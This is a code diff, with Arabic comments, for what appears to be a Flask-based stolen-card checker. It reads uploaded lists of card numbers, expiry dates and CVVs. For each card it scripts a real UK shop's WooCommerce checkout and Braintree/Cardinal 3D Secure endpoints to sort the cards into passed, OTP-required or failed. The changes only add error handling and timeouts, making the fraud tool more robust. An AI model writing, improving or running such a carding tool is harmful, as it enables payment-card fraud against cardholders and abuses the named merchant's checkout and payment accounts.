@@ -43,14 +43,34 @@ def process_cc_file(file_content, tokbot, idbot):
             processing_status['current_card'] = P
             
             try:
-                n = P.split('|')[0]
-                mm = P.split('|')[1]
-                yy = P.split('|')[2][-2:]
-                cvc = P.split('|')[3].replace('\n', '')
+                # تقسيم بيانات البطاقة
+                parts = P.split('|')
+                if len(parts) < 4:
+                    processing_status['failed'] += 1
+                    log_msg = f'[{start_num}] {P} | ERROR: Invalid format'
+                    processing_status['log'].append(log_msg)
+                    continue
+                
+                n = parts[0].strip()
+                mm = parts[1].strip()
+                yy_full = parts[2].strip()
+                cvc = parts[3].replace('\n', '').strip()
+                
+                # استخراج آخر سنتين من السنة
+                if len(yy_full) >= 2:
+                    yy = yy_full[-2:]
+                else:
+                    processing_status['failed'] += 1
+                    log_msg = f'[{start_num}] {P} | ERROR: Invalid year format'
+                    processing_status['log'].append(log_msg)
+                    continue
                 
                 # تنظيف السلة
                 clear_url = "https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/clear"
-                clear_resp = r.post(clear_url)
+                try:
+                    clear_resp = r.post(clear_url, timeout=30)
+                except:
+                    pass  # تجاهل الأخطاء في تنظيف السلة
                 
                 # إضافة عنصر إلى السلة
                 headers = {
@@ -73,13 +93,19 @@ def process_cc_file(file_content, tokbot, idbot):
                 
                 json_data = {'id': '123368', 'quantity': '1'}
                 
-                response = r.post(
-                    'https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/add-item',
-                    headers=headers,
-                    json=json_data,
-                )
-                
-                cart_hash = response.json()['cart_hash']
+                try:
+                    response = r.post(
+                        'https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/add-item',
+                        headers=headers,
+                        json=json_data,
+                        timeout=30
+                    )
+                    cart_hash = response.json()['cart_hash']
+                except:
+                    processing_status['failed'] += 1
+                    log_msg = f'[{start_num}] {P} | ERROR: Failed to add item to cart'
+                    processing_status['log'].append(log_msg)
+                    continue
                 
                 cookies = {
                     'clear_user_data': 'true',
@@ -106,9 +132,24 @@ def process_cc_file(file_content, tokbot, idbot):
                     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                 }
                 
-                response = r.get('https://southenddogtraining.co.uk/checkout/', cookies=cookies, headers=headers)
-                client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
-                add_nonce = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
+                try:
+                    response = r.get('https://southenddogtraining.co.uk/checkout/', cookies=cookies, headers=headers, timeout=30)
+                    client_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
+                    add_nonce_match = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
+                    
+                    if not client_match or not add_nonce_match:
+                        processing_status['failed'] += 1
+                        log_msg = f'[{start_num}] {P} | ERROR: Could not extract tokens'
+                        processing_status['log'].append(log_msg)
+                        continue
+                        
+                    client = client_match.group(1)
+                    add_nonce = add_nonce_match.group(1)
+                except:
+                    processing_status['failed'] += 1
+                    log_msg = f'[{start_num}] {P} | ERROR: Failed to get checkout page'
+                    processing_status['log'].append(log_msg)
+                    continue
                 
                 headers = {
                     'authority': 'southenddogtraining.co.uk',
@@ -131,16 +172,30 @@ def process_cc_file(file_content, tokbot, idbot):
                 
                 data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client}
                 
-                response = r.post(
-                    'https://southenddogtraining.co.uk/cms/wp-admin/admin-ajax.php',
-                    cookies=cookies,
-                    headers=headers,
-                    data=data,
-                )
-                
-                enc = response.json()['data']
-                dec = base64.b64decode(enc).decode('utf-8')
-                au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
+                try:
+                    response = r.post(
+                        'https://southenddogtraining.co.uk/cms/wp-admin/admin-ajax.php',
+                        cookies=cookies,
+                        headers=headers,
+                        data=data,
+                        timeout=30
+                    )
+                    enc = response.json()['data']
+                    dec = base64.b64decode(enc).decode('utf-8')
+                    au_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
+                    
+                    if not au_match:
+                        processing_status['failed'] += 1
+                        log_msg = f'[{start_num}] {P} | ERROR: Could not extract authorization fingerprint'
+                        processing_status['log'].append(log_msg)
+                        continue
+                        
+                    au = au_match[0]
+                except:
+                    processing_status['failed'] += 1
+                    log_msg = f'[{start_num}] {P} | ERROR: Failed to get client token'
+                    processing_status['log'].append(log_msg)
+                    continue
                 
                 headers = {
                     'authority': 'payments.braintree-api.com',
@@ -172,8 +227,14 @@ def process_cc_file(file_content, tokbot, idbot):
                     'operationName': 'ClientConfiguration',
                 }
                 
-                response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-                car = response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
+                try:
+                    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=30)
+                    car = response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
+                except:
+                    processing_status['failed'] += 1
+                    log_msg = f'[{start_num}] {P} | ERROR: Failed to get cardinal authentication JWT'
+                    processing_status['log'].append(log_msg)
+                    continue
                 
                 headers = {
                     'authority': 'centinelapi.cardinalcommerce.com',
@@ -227,10 +288,16 @@ def process_cc_file(file_content, tokbot, idbot):
                     'ServerJWT': car,
                 }
                 
-                response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
-                payload = response.json()['CardinalJWT']
-                ali2 = jwt.decode(payload, options={"verify_signature": False})
-                reid = ali2['ReferenceId']
+                try:
+                    response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data, timeout=30)
+                    payload = response.json()['CardinalJWT']
+                    ali2 = jwt.decode(payload, options={"verify_signature": False})
+                    reid = ali2['ReferenceId']
+                except:
+                    processing_status['failed'] += 1
+                    log_msg = f'[{start_num}] {P} | ERROR: Failed to initialize JWT order'
+                    processing_status['log'].append(log_msg)
+                    continue
                 
                 headers = {
                     'authority': 'geo.cardinalcommerce.com',
@@ -309,12 +376,16 @@ def process_cc_file(file_content, tokbot, idbot):
                     'BinSessionId': '09f2dd83-a00a-42d5-9d89-f2867589860b',
                 }
                 
-                response = r.post(
-                    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
-                    cookies=r.cookies,
-                    headers=headers,
-                    json=json_data,
-                )
+                try:
+                    response = r.post(
+                        'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
+                        cookies=r.cookies,
+                        headers=headers,
+                        json=json_data,
+                        timeout=30
+                    )
+                except:
+                    pass  # تجاهل الأخطاء في حفظ بيانات المتصفح
                 
                 headers = {
                     'authority': 'payments.braintree-api.com',
@@ -348,7 +419,7 @@ def process_cc_file(file_content, tokbot, idbot):
                             'creditCard': {
                                 'number': n,
                                 'expirationMonth': mm,
-                                'expirationYear': yy,
+                                'expirationYear': '20' + yy,  # إضافة القرن
                                 'cvv': cvc,
                             },
                             'options': {
@@ -359,9 +430,15 @@ def process_cc_file(file_content, tokbot, idbot):
                     'operationName': 'TokenizeCreditCard',
                 }
                 
-                response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-                tok = response.json()['data']['tokenizeCreditCard']['token']
-                binn = response.json()['data']['tokenizeCreditCard']['creditCard']['bin']
+                try:
+                    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=30)
+                    tok = response.json()['data']['tokenizeCreditCard']['token']
+                    binn = response.json()['data']['tokenizeCreditCard']['creditCard']['bin']
+                except:
+                    processing_status['failed'] += 1
+                    log_msg = f'[{start_num}] {P} | ERROR: Failed to tokenize credit card'
+                    processing_status['log'].append(log_msg)
+                    continue
                 
                 headers = {
                     'authority': 'api.braintreegateway.com',
@@ -406,27 +483,40 @@ def process_cc_file(file_content, tokbot, idbot):
                     },
                 }
                 
-                response = r.post(
-                    f'https://api.braintreegateway.com/merchants/twtsckjpfh6g4qqg/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
-                    headers=headers,
-                    json=json_data,
-                )
-                
-                vbv = response.json()['paymentMethod']['threeDSecureInfo']['status']
-                
-                if 'authenticate_successful' in vbv or 'authenticate_attempt_successful' in vbv:
-                    processing_status['passed'] += 1
-                    log_msg = f'[{start_num}] {P} | PASSED ✅'
-                    processing_status['log'].append(log_msg)
+                try:
+                    response = r.post(
+                        f'https://api.braintreegateway.com/merchants/twtsckjpfh6g4qqg/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
+                        headers=headers,
+                        json=json_data,
+                        timeout=30
+                    )
                     
-                elif 'challenge_required' in vbv:
-                    processing_status['otp'] += 1
-                    log_msg = f'[{start_num}] {P} | OTP ☑️'
-                    processing_status['log'].append(log_msg)
-                    
-                else:
+                    # التحقق من وجود threeDSecureInfo في الاستجابة
+                    if 'paymentMethod' in response.json() and 'threeDSecureInfo' in response.json()['paymentMethod']:
+                        vbv = response.json()['paymentMethod']['threeDSecureInfo']['status']
+                        
+                        if 'authenticate_successful' in vbv or 'authenticate_attempt_successful' in vbv:
+                            processing_status['passed'] += 1
+                            log_msg = f'[{start_num}] {P} | PASSED ✅'
+                            processing_status['log'].append(log_msg)
+                            
+                        elif 'challenge_required' in vbv:
+                            processing_status['otp'] += 1
+                            log_msg = f'[{start_num}] {P} | OTP ☑️'
+                            processing_status['log'].append(log_msg)
+                            
+                        else:
+                            processing_status['failed'] += 1
+                            log_msg = f'[{start_num}] {P} | {vbv}'
+                            processing_status['log'].append(log_msg)
+                    else:
+                        processing_status['failed'] += 1
+                        log_msg = f'[{start_num}] {P} | ERROR: No 3D secure info in response'
+                        processing_status['log'].append(log_msg)
+                        
+                except:
                     processing_status['failed'] += 1
-                    log_msg = f'[{start_num}] {P} | {vbv}'
+                    log_msg = f'[{start_num}] {P} | ERROR: Failed to perform 3D secure lookup'
                     processing_status['log'].append(log_msg)
                 
                 time.sleep(5)
@@ -461,7 +551,10 @@ def upload_file():
         return jsonify({'error': 'No file selected'})
     
     if file:
-        file_content = file.read().decode('utf-8')
+        try:
+            file_content = file.read().decode('utf-8')
+        except:
+            return jsonify({'error': 'Failed to read file'})
         
         # إعادة تعيين حالة المعالجة
         processing_status = {
